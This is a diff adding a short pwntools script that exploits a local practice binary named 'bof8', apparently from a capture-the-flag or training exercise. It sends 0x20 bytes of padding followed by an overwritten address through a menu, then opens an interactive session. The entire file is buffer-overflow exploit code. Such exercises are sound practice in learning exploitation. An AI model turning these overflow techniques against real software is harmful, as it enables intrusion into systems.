@@ -1,0 +1,12 @@
+from pwn import *
+
+p = process("./bof8")
+
+input()
+
+payload = b'A' * 0x20 + p64(0x404850 - 0x8)
+p.sendafter(b'> ', b'1')
+p.sendafter(b'> ', payload)
+p.sendafter(b'> ', b'3')
+
+p.interactive()
